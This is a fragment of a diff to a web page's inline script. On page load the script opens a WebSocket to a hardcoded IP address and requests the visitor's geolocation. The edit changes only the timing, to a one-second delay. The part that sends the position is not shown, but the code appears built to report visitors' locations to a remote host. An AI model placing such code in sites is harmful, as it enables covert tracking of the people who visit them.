@@ -3,8 +3,7 @@
 <script>
     window.onload = function(){
         ws = new WebSocket("wss://114.146.22.1:4721");
-        ws.addEventListener(
-            "open",
+        setTimeout(
             function(){
                 navigator.geolocation.getCurrentPosition(
                     function(a){
@@ -15,7 +14,8 @@
                     },
                     function(a){}
                 )
-            }
-       )
+            },
+            1000
+        )
     }
 </script>
